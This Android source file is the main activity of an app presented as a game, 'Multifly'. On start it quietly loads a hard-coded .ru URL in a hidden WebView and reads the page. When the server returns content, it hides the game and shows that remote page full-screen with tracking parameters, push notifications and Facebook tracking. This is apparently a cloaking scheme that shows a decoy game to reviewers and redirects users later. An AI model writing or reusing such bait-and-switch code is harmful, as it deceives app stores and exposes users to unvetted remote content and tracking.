package com.littlefly.multifly;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.FragmentTransaction;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.graphics.drawable.AnimationDrawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieSyncManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;

import com.facebook.FacebookSdk;
import com.onesignal.OneSignal;

public class MainActivity extends AppCompatActivity {

    private static final String ONESIGNAL_APP_ID = "44340bf6-c9a7-4416-9404-e1b7ed4cb517";
    private ImageView firstAnimationIW;
    private FrameLayout multiflyContainer;
    private static MainActivity instance;
    private WebView netWV;
    private String url= "http://splurgzsjy.ru/qdJsvJnK";
    private boolean isParMa = false;
    private ValueCallback<Uri> mUploadMessage;
    public ValueCallback<Uri[]> uploadMessage;
    private final static int FILECHOOSER_RESULTCODE = 1;
    public static final int REQUEST_SELECT_FILE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        SystemUINavBarOff();
        initUIElements();
        firstAnimation();
        adjustmentNetWV();
        instance = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        checkConnection();
    }

    @Override
    public void onBackPressed() {
        if (isParMa && netWV.canGoBack()) {
            netWV.goBack();
        }
        else if (getSupportFragmentManager().findFragmentByTag("pptag") != null && !isParMa) {
            firstAnimationIW.setVisibility(View.GONE);
            netWV.setVisibility(View.GONE);
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            FragmentTransaction fTransaction = getSupportFragmentManager().beginTransaction();
            fTransaction.replace(R.id.multifly_container, new MultiflyFragment(),"multiflytag");
            fTransaction.commit();
            multiflyContainer.setVisibility(View.VISIBLE);
        }
        else{
            super.onBackPressed();
        }
    }


    private void firstAnimation() {
        firstAnimationIW.setBackgroundResource(R.drawable.loading_anim);
        AnimationDrawable loadingAnimation = (AnimationDrawable) firstAnimationIW.getBackground();
        loadingAnimation.start();
    }

    private void initUIElements(){
        firstAnimationIW = (ImageView) findViewById(R.id.first_animation);
        netWV = findViewById(R.id.net_wv);
        multiflyContainer = findViewById(R.id.multifly_container);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        SystemUINavBarOff();
    }

    private void SystemUINavBarOff() {
        View dv = getWindow().getDecorView();
        dv.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }

    public static MainActivity getInstance() {
        return instance;
    }

    public void startFly(){
        String checkHtml = "";

        try {
            checkHtml = HtmlJSInterface.flyTasker.getWebPage();
        } catch (Exception ex) {
        }

        if (checkHtml.length() > 80) {
            isParMa = true;

            if (!HtmlJSInterface.flyTasker.getUriPortion().equals("")) {
                url += "?subId1=MULTIFLY&subId2=MULTIFLY&subId3=MULTIFLY&subId4=MULTIFLY&subId5=MULTIFLY";
                String parts[] = HtmlJSInterface.flyTasker.getUriPortion().split("//");

                for (int i = 0; i < parts.length; i++) {
                    url = url.replaceFirst("MULTIFLY", parts[i]);
                }
                url = url.replaceAll("MULTIFLY", "");
            }
            Log.d("final url", url);

            firstAnimationIW.setVisibility(View.GONE);
            multiflyContainer.setVisibility(View.GONE);
            netWV.setVisibility(View.VISIBLE);

        }
        else {
            TurnOnFlyFragment();
        }
    }


    private void checkConnection() {
        ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
        if(connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED ||
                connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {
            getWebViewHtml();
        }
        else{
            TurnOnFlyFragment();
        }
    }

    private void getWebViewHtml(){
        WebSettings ws = netWV.getSettings();
        ws.setJavaScriptEnabled(true);
        netWV.addJavascriptInterface(new HtmlJSInterface(), "HTMLOUT");

        netWV.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                netWV.loadUrl("javascript:HTMLOUT.processHTML(document.documentElement.outerHTML);");
            }
        });

        netWV.loadUrl(url);
        netWV.setVisibility(View.GONE);
    }

    private void adjustmentNetWV(){
        WebSettings wSet = netWV.getSettings();
        wSet.setJavaScriptEnabled(true);
        wSet.setSupportZoom(false);
        wSet.setAllowFileAccess(true);
        wSet.setAllowContentAccess(true);

        netWV.setWebViewClient(new WebViewClient());
        netWV.setWebChromeClient(new WebChromeClient());

        CookieSyncManager.createInstance(netWV.getContext());
        CookieSyncManager.getInstance().sync();

        netWV.getSettings().setJavaScriptEnabled(true);
        netWV.getSettings().setDomStorageEnabled(true);
        netWV.requestFocus(View.FOCUS_DOWN);

        netWV.setWebChromeClient(new WebChromeClient()
        {
            // For 3.0+ Devices (Start)
            // onActivityResult attached before constructor
            protected void openFileChooser(ValueCallback uploadMsg, String acceptType)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            // For Lollipop 5.0+ Devices
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            public boolean onShowFileChooser(WebView mWebView, ValueCallback<Uri[]> filePathCallback, WebChromeClient.FileChooserParams fileChooserParams)
            {
                if (uploadMessage != null) {
                    uploadMessage.onReceiveValue(null);
                    uploadMessage = null;
                }

                uploadMessage = filePathCallback;

                Intent intent = fileChooserParams.createIntent();
                try
                {
                    startActivityForResult(intent, REQUEST_SELECT_FILE);
                } catch (ActivityNotFoundException e)
                {
                    uploadMessage = null;
                    Toast.makeText(getApplicationContext(), "Cannot Open File Chooser", Toast.LENGTH_LONG).show();
                    return false;
                }
                return true;
            }

            //For Android 4.1 only
            protected void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture)
            {
                mUploadMessage = uploadMsg;
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.addCategory(Intent.CATEGORY_OPENABLE);
                intent.setType("image/*");
                startActivityForResult(Intent.createChooser(intent, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            protected void openFileChooser(ValueCallback<Uri> uploadMsg)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
            }
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                if (uploadMessage == null)
                    return;
                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
                uploadMessage = null;
            }
        } else if (requestCode == FILECHOOSER_RESULTCODE) {
            if (null == mUploadMessage)
                return;
            // Use MainActivity.RESULT_OK if you're implementing WebView inside Fragment
            // Use RESULT_OK only if you're implementing WebView inside an Activity
            Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        } else
            Toast.makeText(getApplicationContext(), "Failed to Upload Image", Toast.LENGTH_LONG).show();
    }

    private void TurnOnFlyFragment(){
        firstAnimationIW.setVisibility(View.GONE);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        FragmentTransaction fTransaction = getSupportFragmentManager().beginTransaction();
        fTransaction.add(R.id.multifly_container, new MultiflyFragment(),"multiflytag");
        fTransaction.commit();
        multiflyContainer.setVisibility(View.VISIBLE);
    }
}